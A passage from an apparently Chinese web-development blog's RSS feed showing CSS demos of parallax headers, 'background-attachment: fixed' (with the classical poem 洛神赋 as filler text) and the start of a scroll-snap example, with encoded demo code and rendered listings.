  <span>perspective</span><span>:</span> 1px<span>;</span>
  <span>transform-style</span><span>:</span> preserve-3d<span>;</span>
<span>}</span>

<span>header</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>transform-style</span><span>:</span> inherit<span>;</span>
  <span>transform</span><span>:</span> <span>translateZ</span><span>(</span>-0.9px<span>)</span> <span>scale</span><span>(</span>2<span>)</span><span>;</span> <span>/* Z轴远离平面后显小，放大回归正常平面观感 */</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-2.webp<span>)</span></span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>article</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>text-indent</span><span>:</span> 2em<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
  <span>letter-spacing</span><span>:</span> 8px<span>;</span>
  <span>padding</span><span>:</span> 1em 0<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>background</span><span>:</span> #fff<span>;</span>
<span>}</span>

<span>::-webkit-scrollbar</span> <span>{</span>
  <span>width</span><span>:</span> 8px<span>;</span>
  <span>height</span><span>:</span> 8px<span>;</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
<span>}</span>

<span>::-webkit-scrollbar-thumb</span> <span>{</span>
  <span>border-radius</span><span>:</span> 10px<span>;</span>
  <span>background</span><span>:</span> #40bf95ff<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br></div></div>
            </div>
          </div>
          
        </div>
<h3 id="background-attachment-fixed"> background-attachment: fixed</h3>
<blockquote>
<p>相对于视口固定</p>
</blockquote>

          <div
            id="code-demo-eb70cf1e"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Carticle%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E9%BB%84%E5%88%9D%E4%B8%89%E5%B9%B4%EF%BC%8C%E4%BD%99%E6%9C%9D%E4%BA%AC%E5%B8%88%EF%BC%8C%E8%BF%98%E6%B5%8E%E6%B4%9B%E5%B7%9D%E3%80%82%E5%8F%A4%E4%BA%BA%E6%9C%89%E8%A8%80%EF%BC%9A%E6%96%AF%E6%B0%B4%E4%B9%8B%E7%A5%9E%EF%BC%8C%E5%90%8D%E6%9B%B0%E5%AE%93%E5%A6%83%E3%80%82%E6%84%9F%E5%AE%8B%E7%8E%89%E5%AF%B9%E6%A5%9A%E7%8E%8B%E7%A5%9E%E5%A5%B3%E4%B9%8B%E4%BA%8B%EF%BC%8C%E9%81%82%E4%BD%9C%E6%96%AF%E8%B5%8B%E3%80%82%E5%85%B6%E8%AF%8D%E6%9B%B0%EF%BC%9A%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E4%BB%8E%E4%BA%AC%E5%9F%9F%EF%BC%8C%E8%A8%80%E5%BD%92%E4%B8%9C%E8%97%A9%EF%BC%8C%E8%83%8C%E4%BC%8A%E9%98%99%EF%BC%8C%E8%B6%8A%E8%BD%98%E8%BE%95%EF%BC%8C%E7%BB%8F%E9%80%9A%E8%B0%B7%EF%BC%8C%E9%99%B5%E6%99%AF%E5%B1%B1%E3%80%82%E6%97%A5%E6%97%A2%E8%A5%BF%E5%80%BE%EF%BC%8C%E8%BD%A6%E6%AE%86%E9%A9%AC%E7%83%A6%E3%80%82%E5%B0%94%E4%B9%83%E7%A8%8E%E9%A9%BE%E4%B9%8E%E8%98%85%E7%9A%8B%EF%BC%8C%E7%A7%A3%E9%A9%B7%E4%B9%8E%E8%8A%9D%E7%94%B0%EF%BC%8C%E5%AE%B9%E4%B8%8E%E4%B9%8E%E9%98%B3%E6%9E%97%EF%BC%8C%E6%B5%81%E7%9C%84%E4%B9%8E%E6%B4%9B%E5%B7%9D%E3%80%82%E4%BA%8E%E6%98%AF%E7%B2%BE%E7%A7%BB%E7%A5%9E%E9%AA%87%EF%BC%8C%E5%BF%BD%E7%84%89%E6%80%9D%E6%95%A3%E3%80%82%E4%BF%AF%E5%88%99%E6%9C%AA%E5%AF%9F%EF%BC%8C%E4%BB%B0%E4%BB%A5%E6%AE%8A%E8%A7%82%E3%80%82%E7%9D%B9%E4%B8%80%E4%B8%BD%E4%BA%BA%EF%BC%8C%E4%BA%8E%E5%B2%A9%E4%B9%8B%E7%95%94%E3%80%82%E4%B9%83%E6%8F%B4%E5%BE%A1%E8%80%85%E8%80%8C%E5%91%8A%E4%B9%8B%E6%9B%B0%EF%BC%9A%E2%80%9C%E5%B0%94%E6%9C%89%E8%A7%8C%E4%BA%8E%E5%BD%BC%E8%80%85%E4%B9%8E%EF%BC%9F%E5%BD%BC%E4%BD%95%E4%BA%BA%E6%96%AF%EF%BC%8C%E8%8B%A5%E6%AD%A4%E4%B9%8B%E8%89%B3%E4%B9%9F%EF%BC%81%E2%80%9D%E5%BE%A1%E8%80%85%E5%AF%B9%E6%9B%B0%EF%BC%9A%E2%80%9C%E8%87%A3%E9%97%BB%E6%B2%B3%E6%B4%9B%E4%B9%8B%E7%A5%9E%EF%BC%8C%E5%90%8D%E6%9B%B0%E5%AE%93%E5%A6%83%E3%80%82%E7%84%B6%E5%88%99%E5%90%9B%E7%8E%8B%E4%B9%8B%E6%89%80%E8%A7%81%E4%B9%9F%EF%BC%8C%E6%97%A0%E4%B9%83%E6%98%AF%E4%B9%8E%EF%BC%81%E5%85%B6%E7%8A%B6%E8%8B%A5%E4%BD%95%EF%BC%9F%E8%87%A3%E6%84%BF%E9%97%BB%E4%B9%8B%E3%80%82%E2%80%9D%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E5%91%8A%E4%B9%8B%E6%9B%B0%EF%BC%9A%E5%85%B6%E5%BD%A2%E4%B9%9F%EF%BC%8C%E7%BF%A9%E8%8B%A5%E6%83%8A%E9%B8%BF%EF%BC%8C%E5%A9%89%E8%8B%A5%E6%B8%B8%E9%BE%99%E3%80%82%E8%8D%A3%E6%9B%9C%E7%A7%8B%E8%8F%8A%EF%BC%8C%E5%8D%8E%E8%8C%82%E6%98%A5%E6%9D%BE%E3%80%82%E9%AB%A3%E9%AB%B4%E5%85%AE%E8%8B%A5%E8%BD%BB%E4%BA%91%E4%B9%8B%E8%94%BD%E6%9C%88%EF%BC%8C%E9%A3%98%E9%A3%96%E5%85%AE%E8%8B%A5%E6%B5%81%E9%A3%8E%E4%B9%8B%E5%9B%9E%E9%9B%AA%E3%80%82%E8%BF%9C%E8%80%8C%E6%9C%9B%E4%B9%8B%EF%BC%8C%E7%9A%8E%E8%8B%A5%E5%A4%AA%E9%98%B3%E5%8D%87%E6%9C%9D%E9%9C%9E%EF%BC%9B%E8%BF%AB%E8%80%8C%E5%AF%9F%E4%B9%8B%EF%BC%8C%E7%81%BC%E8%8B%A5%E8%8A%99%E8%95%96%E5%87%BA%E6%B8%8C%E6%B3%A2%E3%80%82%E7%A7%BE%E7%BA%A4%E5%BE%97%E8%A1%B7%EF%BC%8C%E4%BF%AE%E7%9F%AD%E5%90%88%E5%BA%A6%E3%80%82%E8%82%A9%E8%8B%A5%E5%89%8A%E6%88%90%EF%BC%8C%E8%85%B0%E5%A6%82%E7%BA%A6%E7%B4%A0%E3%80%82%E5%BB%B6%E9%A2%88%E7%A7%80%E9%A1%B9%EF%BC%8C%E7%9A%93%E8%B4%A8%E5%91%88%E9%9C%B2%E3%80%82%E8%8A%B3%E6%B3%BD%E6%97%A0%E5%8A%A0%EF%BC%8C%E9%93%85%E5%8D%8E%E5%BC%97%E5%BE%A1%E3%80%82%E4%BA%91%E9%AB%BB%E5%B3%A8%E5%B3%A8%EF%BC%8C%E4%BF%AE%E7%9C%89%E8%81%94%E5%A8%9F%E3%80%82%E4%B8%B9%E5%94%87%E5%A4%96%E6%9C%97%EF%BC%8C%E7%9A%93%E9%BD%BF%E5%86%85%E9%B2%9C%E3%80%82%E6%98%8E%E7%9C%B8%E5%96%84%E7%9D%90%EF%BC%8C%E9%9D%A5%E8%BE%85%E6%89%BF%E6%9D%83%E3%80%82%E7%93%8C%E5%A7%BF%E8%89%B3%E9%80%B8%EF%BC%8C%E4%BB%AA%E9%9D%99%E4%BD%93%E9%97%B2%E3%80%82%E6%9F%94%E6%83%85%E7%BB%B0%E6%80%81%EF%BC%8C%E5%AA%9A%E4%BA%8E%E8%AF%AD%E8%A8%80%E3%80%82%E5%A5%87%E6%9C%8D%E6%97%B7%E4%B8%96%EF%BC%8C%E9%AA%A8%E5%83%8F%E5%BA%94%E5%9B%BE%E3%80%82%E6%8A%AB%E7%BD%97%E8%A1%A3%E4%B9%8B%E7%92%80%E7%B2%B2%E5%85%AE%EF%BC%8C%E7%8F%A5%E7%91%B6%E7%A2%A7%E4%B9%8B%E5%8D%8E%E7%90%9A%E3%80%82%E6%88%B4%E9%87%91%E7%BF%A0%E4%B9%8B%E9%A6%96%E9%A5%B0%EF%BC%8C%E7%BC%80%E6%98%8E%E7%8F%A0%E4%BB%A5%E8%80%80%E8%BA%AF%E3%80%82%E8%B7%B5%E8%BF%9C%E6%B8%B8%E4%B9%8B%E6%96%87%E5%B1%A5%EF%BC%8C%E6%9B%B3%E9%9B%BE%E7%BB%A1%E4%B9%8B%E8%BD%BB%E8%A3%BE%E3%80%82%E5%BE%AE%E5%B9%BD%E5%85%B0%E4%B9%8B%E8%8A%B3%E8%94%BC%E5%85%AE%EF%BC%8C%E6%AD%A5%E8%B8%9F%E8%B9%B0%E4%BA%8E%E5%B1%B1%E9%9A%85%E3%80%82%E4%BA%8E%E6%98%AF%E5%BF%BD%E7%84%89%E7%BA%B5%E4%BD%93%EF%BC%8C%E4%BB%A5%E9%81%A8%E4%BB%A5%E5%AC%89%E3%80%82%E5%B7%A6%E5%80%9A%E9%87%87%E6%97%84%EF%BC%8C%E5%8F%B3%E8%8D%AB%E6%A1%82%E6%97%97%E3%80%82%E6%94%98%E7%9A%93%E8%85%95%E4%BA%8E%E7%A5%9E%E6%B5%92%E5%85%AE%EF%BC%8C%E9%87%87%E6%B9%8D%E6%BF%91%E4%B9%8B%E7%8E%84%E8%8A%9D%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BD%99%E6%83%85%E6%82%A6%E5%85%B6%E6%B7%91%E7%BE%8E%E5%85%AE%EF%BC%8C%E5%BF%83%E6%8C%AF%E8%8D%A1%E8%80%8C%E4%B8%8D%E6%80%A1%E3%80%82%E6%97%A0%E8%89%AF%E5%AA%92%E4%BB%A5%E6%8E%A5%E6%AC%A2%E5%85%AE%EF%BC%8C%E6%89%98%E5%BE%AE%E6%B3%A2%E8%80%8C%E9%80%9A%E8%BE%9E%E3%80%82%E6%84%BF%E8%AF%9A%E7%B4%A0%E4%B9%8B%E5%85%88%E8%BE%BE%E5%85%AE%EF%BC%8C%E8%A7%A3%E7%8E%89%E4%BD%A9%E4%BB%A5%E8%A6%81%E4%B9%8B%E3%80%82%E5%97%9F%E4%BD%B3%E4%BA%BA%E4%B9%8B%E4%BF%A1%E4%BF%AE%E5%85%AE%EF%BC%8C%E7%BE%8C%E4%B9%A0%E7%A4%BC%E8%80%8C%E6%98%8E%E8%AF%97%E3%80%82%E6%8A%97%E7%90%BC%E7%8F%B6%E4%BB%A5%E5%92%8C%E4%BA%88%E5%85%AE%EF%BC%8C%E6%8C%87%E6%BD%9C%E6%B8%8A%E8%80%8C%E4%B8%BA%E6%9C%9F%E3%80%82%E6%89%A7%E7%9C%B7%E7%9C%B7%E4%B9%8B%E6%AC%BE%E5%AE%9E%E5%85%AE%EF%BC%8C%E6%83%A7%E6%96%AF%E7%81%B5%E4%B9%8B%E6%88%91%E6%AC%BA%E3%80%82%E6%84%9F%E4%BA%A4%E7%94%AB%E4%B9%8B%E5%BC%83%E8%A8%80%E5%85%AE%EF%BC%8C%E6%80%85%E7%8A%B9%E8%B1%AB%E8%80%8C%E7%8B%90%E7%96%91%E3%80%82%E6%94%B6%E5%92%8C%E9%A2%9C%E8%80%8C%E9%9D%99%E5%BF%97%E5%85%AE%EF%BC%8C%E7%94%B3%E7%A4%BC%E9%98%B2%E4%BB%A5%E8%87%AA%E6%8C%81%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E6%B4%9B%E7%81%B5%E6%84%9F%E7%84%89%EF%BC%8C%E5%BE%99%E5%80%9A%E5%BD%B7%E5%BE%A8%E3%80%82%E7%A5%9E%E5%85%89%E7%A6%BB%E5%90%88%EF%BC%8C%E4%B9%8D%E9%98%B4%E4%B9%8D%E9%98%B3%E3%80%82%E7%AB%A6%E8%BD%BB%E8%BA%AF%E4%BB%A5%E9%B9%A4%E7%AB%8B%EF%BC%8C%E8%8B%A5%E5%B0%86%E9%A3%9E%E8%80%8C%E6%9C%AA%E7%BF%94%E3%80%82%E8%B7%B5%E6%A4%92%E6%B6%82%E4%B9%8B%E9%83%81%E7%83%88%EF%BC%8C%E6%AD%A5%E8%98%85%E8%96%84%E8%80%8C%E6%B5%81%E8%8A%B3%E3%80%82%E8%B6%85%E9%95%BF%E5%90%9F%E4%BB%A5%E6%B0%B8%E6%85%95%E5%85%AE%EF%BC%8C%E5%A3%B0%E5%93%80%E5%8E%89%E8%80%8C%E5%BC%A5%E9%95%BF%E3%80%82%E5%B0%94%E4%B9%83%E4%BC%97%E7%81%B5%E6%9D%82%E6%B2%93%EF%BC%8C%E5%91%BD%E4%BF%A6%E5%95%B8%E4%BE%A3%E3%80%82%E6%88%96%E6%88%8F%E6%B8%85%E6%B5%81%EF%BC%8C%E6%88%96%E7%BF%94%E7%A5%9E%E6%B8%9A%EF%BC%8C%E6%88%96%E9%87%87%E6%98%8E%E7%8F%A0%EF%BC%8C%E6%88%96%E6%8B%BE%E7%BF%A0%E7%BE%BD%E3%80%82%E4%BB%8E%E5%8D%97%E6%B9%98%E4%B9%8B%E4%BA%8C%E5%A6%83%EF%BC%8C%E6%90%BA%E6%B1%89%E6%BB%A8%E4%B9%8B%E6%B8%B8%E5%A5%B3%E3%80%82%E5%8F%B9%E5%8C%8F%E7%93%9C%E4%B9%8B%E6%97%A0%E5%8C%B9%E5%85%AE%EF%BC%8C%E5%92%8F%E7%89%B5%E7%89%9B%E4%B9%8B%E7%8B%AC%E5%A4%84%E3%80%82%E6%89%AC%E8%BD%BB%E8%A2%BF%E4%B9%8B%E7%8C%97%E9%9D%A1%E5%85%AE%EF%BC%8C%E7%BF%B3%E4%BF%AE%E8%A2%96%E4%BB%A5%E5%BB%B6%E4%BC%AB%E3%80%82%E4%BD%93%E8%BF%85%E9%A3%9E%E5%87%AB%EF%BC%8C%E9%A3%98%E5%BF%BD%E8%8B%A5%E7%A5%9E%E3%80%82%E5%87%8C%E6%B3%A2%E5%BE%AE%E6%AD%A5%EF%BC%8C%E7%BD%97%E8%A2%9C%E7%94%9F%E5%B0%98%E3%80%82%E5%8A%A8%E6%97%A0%E5%B8%B8%E5%88%99%EF%BC%8C%E8%8B%A5%E5%8D%B1%E8%8B%A5%E5%AE%89%EF%BC%9B%E8%BF%9B%E6%AD%A2%E9%9A%BE%E6%9C%9F%EF%BC%8C%E8%8B%A5%E5%BE%80%E8%8B%A5%E8%BF%98%E3%80%82%E8%BD%AC%E7%9C%84%E6%B5%81%E7%B2%BE%EF%BC%8C%E5%85%89%E6%B6%A6%E7%8E%89%E9%A2%9C%E3%80%82%E5%90%AB%E8%BE%9E%E6%9C%AA%E5%90%90%EF%BC%8C%E6%B0%94%E8%8B%A5%E5%B9%BD%E5%85%B0%E3%80%82%E5%8D%8E%E5%AE%B9%E5%A9%80%E5%A8%9C%EF%BC%8C%E4%BB%A4%E6%88%91%E5%BF%98%E9%A4%90%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E5%B1%8F%E7%BF%B3%E6%94%B6%E9%A3%8E%EF%BC%8C%E5%B7%9D%E5%90%8E%E9%9D%99%E6%B3%A2%E3%80%82%E5%86%AF%E5%A4%B7%E9%B8%A3%E9%BC%93%EF%BC%8C%E5%A5%B3%E5%A8%B2%E6%B8%85%E6%AD%8C%E3%80%82%E8%85%BE%E6%96%87%E9%B1%BC%E4%BB%A5%E8%AD%A6%E4%B9%98%EF%BC%8C%E9%B8%A3%E7%8E%89%E9%8A%AE%E4%BB%A5%E5%81%95%E9%80%9D%E3%80%82%E5%85%AD%E9%BE%99%E4%BF%A8%E5%85%B6%E9%BD%90%E9%A6%96%EF%BC%8C%E8%BD%BD%E4%BA%91%E8%BD%A6%E4%B9%8B%E5%AE%B9%E8%A3%94%E3%80%82%E9%B2%B8%E9%B2%B5%E8%B8%8A%E8%80%8C%E5%A4%B9%E6%AF%82%EF%BC%8C%E6%B0%B4%E7%A6%BD%E7%BF%94%E8%80%8C%E4%B8%BA%E5%8D%AB%E3%80%82%E4%BA%8E%E6%98%AF%E8%B6%8A%E5%8C%97%E6%B2%9A%EF%BC%8C%E8%BF%87%E5%8D%97%E5%86%88%EF%BC%8C%E7%BA%A1%E7%B4%A0%E9%A2%86%EF%BC%8C%E5%9B%9E%E6%B8%85%E6%89%AC%E3%80%82%E5%8A%A8%E6%9C%B1%E5%94%87%E4%BB%A5%E5%BE%90%E8%A8%80%EF%BC%8C%E9%99%88%E4%BA%A4%E6%8E%A5%E4%B9%8B%E5%A4%A7%E7%BA%B2%E3%80%82%E6%81%A8%E4%BA%BA%E7%A5%9E%E4%B9%8B%E9%81%93%E6%AE%8A%E5%85%AE%EF%BC%8C%E6%80%A8%E7%9B%9B%E5%B9%B4%E4%B9%8B%E8%8E%AB%E5%BD%93%E3%80%82%E6%8A%97%E7%BD%97%E8%A2%82%E4%BB%A5%E6%8E%A9%E6%B6%95%E5%85%AE%EF%BC%8C%E6%B3%AA%E6%B5%81%E8%A5%9F%E4%B9%8B%E6%B5%AA%E6%B5%AA%E3%80%82%E6%82%BC%E8%89%AF%E4%BC%9A%E4%B9%8B%E6%B0%B8%E7%BB%9D%E5%85%AE%EF%BC%8C%E5%93%80%E4%B8%80%E9%80%9D%E8%80%8C%E5%BC%82%E4%B9%A1%E3%80%82%E6%97%A0%E5%BE%AE%E6%83%85%E4%BB%A5%E6%95%88%E7%88%B1%E5%85%AE%EF%BC%8C%E7%8C%AE%E6%B1%9F%E5%8D%97%E4%B9%8B%E6%98%8E%E7%8F%B0%E3%80%82%E8%99%BD%E6%BD%9C%E5%A4%84%E4%BA%8E%E5%A4%AA%E9%98%B4%EF%BC%8C%E9%95%BF%E5%AF%84%E5%BF%83%E4%BA%8E%E5%90%9B%E7%8E%8B%E3%80%82%E5%BF%BD%E4%B8%8D%E6%82%9F%E5%85%B6%E6%89%80%E8%88%8D%EF%BC%8C%E6%80%85%E7%A5%9E%E5%AE%B5%E8%80%8C%E8%94%BD%E5%85%89%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%20%20%3Cp%3E%5Cn%20%20%20%20%20%20%E4%BA%8E%E6%98%AF%E8%83%8C%E4%B8%8B%E9%99%B5%E9%AB%98%EF%BC%8C%E8%B6%B3%E5%BE%80%E7%A5%9E%E7%95%99%E3%80%82%E9%81%97%E6%83%85%E6%83%B3%E5%83%8F%EF%BC%8C%E9%A1%BE%E6%9C%9B%E6%80%80%E6%84%81%E3%80%82%E5%86%80%E7%81%B5%E4%BD%93%E4%B9%8B%E5%A4%8D%E5%BD%A2%EF%BC%8C%E5%BE%A1%E8%BD%BB%E8%88%9F%E8%80%8C%E4%B8%8A%E6%BA%AF%E3%80%82%E6%B5%AE%E9%95%BF%E5%B7%9D%E8%80%8C%E5%BF%98%E5%8F%8D%EF%BC%8C%E6%80%9D%E7%BB%B5%E7%BB%B5%E8%80%8C%E5%A2%9E%E6%85%95%E3%80%82%E5%A4%9C%E8%80%BF%E8%80%BF%E8%80%8C%E4%B8%8D%E5%AF%90%EF%BC%8C%E6%B2%BE%E7%B9%81%E9%9C%9C%E8%80%8C%E8%87%B3%E6%9B%99%E3%80%82%E5%91%BD%E4%BB%86%E5%A4%AB%E8%80%8C%E5%B0%B1%E9%A9%BE%EF%BC%8C%E5%90%BE%E5%B0%86%E5%BD%92%E4%B9%8E%E4%B8%9C%E8%B7%AF%E3%80%82%E6%8F%BD%E9%A8%91%E8%BE%94%E4%BB%A5%E6%8A%97%E7%AD%96%EF%BC%8C%E6%80%85%E7%9B%98%E6%A1%93%E8%80%8C%E4%B8%8D%E8%83%BD%E5%8E%BB%E3%80%82%5Cn%20%20%20%20%3C%2Fp%3E%5Cn%20%20%3C%2Farticle%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22section%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-2.webp)%20center%2Fcover%20no-repeat%5Cn%20%20%20%20fixed%3B%5Cn%7D%5Cn%5Cnarticle%20%7B%5Cn%20%20text-indent%3A%202em%3B%5Cn%20%20font-size%3A%2018px%3B%5Cn%20%20color%3A%20%23ffb8c4ff%3B%5Cn%20%20letter-spacing%3A%208px%3B%5Cn%20%20padding%3A%201em%200%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>article</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      黄初三年，余朝京师，还济洛川。古人有言：斯水之神，名曰宓妃。感宋玉对楚王神女之事，遂作斯赋。其词曰：
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余从京域，言归东藩，背伊阙，越轘辕，经通谷，陵景山。日既西倾，车殆马烦。尔乃税驾乎蘅皋，秣驷乎芝田，容与乎阳林，流眄乎洛川。于是精移神骇，忽焉思散。俯则未察，仰以殊观。睹一丽人，于岩之畔。乃援御者而告之曰：“尔有觌于彼者乎？彼何人斯，若此之艳也！”御者对曰：“臣闻河洛之神，名曰宓妃。然则君王之所见也，无乃是乎！其状若何？臣愿闻之。”
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余告之曰：其形也，翩若惊鸿，婉若游龙。荣曜秋菊，华茂春松。髣髴兮若轻云之蔽月，飘飖兮若流风之回雪。远而望之，皎若太阳升朝霞；迫而察之，灼若芙蕖出渌波。秾纤得衷，修短合度。肩若削成，腰如约素。延颈秀项，皓质呈露。芳泽无加，铅华弗御。云髻峨峨，修眉联娟。丹唇外朗，皓齿内鲜。明眸善睐，靥辅承权。瓌姿艳逸，仪静体闲。柔情绰态，媚于语言。奇服旷世，骨像应图。披罗衣之璀粲兮，珥瑶碧之华琚。戴金翠之首饰，缀明珠以耀躯。践远游之文履，曳雾绡之轻裾。微幽兰之芳蔼兮，步踟蹰于山隅。于是忽焉纵体，以遨以嬉。左倚采旄，右荫桂旗。攘皓腕于神浒兮，采湍濑之玄芝。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      余情悦其淑美兮，心振荡而不怡。无良媒以接欢兮，托微波而通辞。愿诚素之先达兮，解玉佩以要之。嗟佳人之信修兮，羌习礼而明诗。抗琼珶以和予兮，指潜渊而为期。执眷眷之款实兮，惧斯灵之我欺。感交甫之弃言兮，怅犹豫而狐疑。收和颜而静志兮，申礼防以自持。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是洛灵感焉，徙倚彷徨。神光离合，乍阴乍阳。竦轻躯以鹤立，若将飞而未翔。践椒涂之郁烈，步蘅薄而流芳。超长吟以永慕兮，声哀厉而弥长。尔乃众灵杂沓，命俦啸侣。或戏清流，或翔神渚，或采明珠，或拾翠羽。从南湘之二妃，携汉滨之游女。叹匏瓜之无匹兮，咏牵牛之独处。扬轻袿之猗靡兮，翳修袖以延伫。体迅飞凫，飘忽若神。凌波微步，罗袜生尘。动无常则，若危若安；进止难期，若往若还。转眄流精，光润玉颜。含辞未吐，气若幽兰。华容婀娜，令我忘餐。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是屏翳收风，川后静波。冯夷鸣鼓，女娲清歌。腾文鱼以警乘，鸣玉銮以偕逝。六龙俨其齐首，载云车之容裔。鲸鲵踊而夹毂，水禽翔而为卫。于是越北沚，过南冈，纡素领，回清扬。动朱唇以徐言，陈交接之大纲。恨人神之道殊兮，怨盛年之莫当。抗罗袂以掩涕兮，泪流襟之浪浪。悼良会之永绝兮，哀一逝而异乡。无微情以效爱兮，献江南之明珰。虽潜处于太阴，长寄心于君王。忽不悟其所舍，怅神宵而蔽光。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span>
      于是背下陵高，足往神留。遗情想像，顾望怀愁。冀灵体之复形，御轻舟而上溯。浮长川而忘反，思绵绵而增慕。夜耿耿而不寐，沾繁霜而至曙。命仆夫而就驾，吾将归乎东路。揽騑辔以抗策，怅盘桓而不能去。
    <span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;/</span>article</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></div></div><div><pre><code><span>section</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-2.webp<span>)</span></span> center/cover no-repeat
    fixed<span>;</span>
<span>}</span>

<span>article</span> <span>{</span>
  <span>text-indent</span><span>:</span> 2em<span>;</span>
  <span>font-size</span><span>:</span> 18px<span>;</span>
  <span>color</span><span>:</span> #ffb8c4ff<span>;</span>
  <span>letter-spacing</span><span>:</span> 8px<span>;</span>
  <span>padding</span><span>:</span> 1em 0<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div>
            </div>
          </div>
          
        </div>
<div><p>注意</p>
<p>奇怪！ background-attachment: fixed; 在此 Demo 中不生效，可恶！！！</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>滚动贴合</title>
      <link>https://www.matrixtheone.ga/web/magic/Scroll-Snap/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Scroll-Snap/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">滚动贴合</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-20c7991b"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%20%20%3Csection%3E%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20scroll-snap-type%3A%20y%20mandatory%3B%5Cn%20%20overflow-y%3A%20scroll%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20center%2Fcover%20no-repeat%3B%5Cn%20%20scroll-snap-align%3A%20start%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(1)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-3.webp)%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(2)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-4.webp)%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(3)%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-5.webp)%3B%5Cn%7D%5Cn%5Cn%3A%3A-webkit-scrollbar%20%7B%5Cn%20%20width%3A%200%3B%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
